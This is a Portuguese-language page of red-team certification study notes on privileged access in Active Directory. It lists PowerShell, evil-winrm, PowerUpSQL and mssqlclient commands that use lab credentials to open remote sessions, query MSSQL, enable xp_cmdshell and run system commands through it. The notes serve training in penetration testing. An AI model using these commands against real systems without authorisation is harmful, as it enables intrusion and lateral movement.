> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/privileged-access.md).

# Privileged Access

* **Enumerando o grupo de usuários da Área de Trabalho Remota**

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

* **Enumerando o grupo de usuários de gerenciamento remoto**

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

* **Estabelecendo a sessão do WinRM no Windows**

{% code lineNumbers="true" %}

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

{% endcode %}

* **Conectando-se a um destino com Evil-WinRM e credenciais válidas**

```sh
evil-winrm -i 10.129.201.234 -u forend
```

* **Enumerando instâncias MSSQL com PowerUpSQL**

{% code lineNumbers="true" %}

```powershell
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

{% endcode %}

* **Correndo mssqlclient.py contra o alvo**

```sh
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

* **Escolhendo enable\_xp\_cmdshell**

```sql
SQL> enable_xp_cmdshell
```

* **Enumerando nossos direitos no sistema usando xp\_cmdshell**

```sql
xp_cmdshell whoami /priv
```
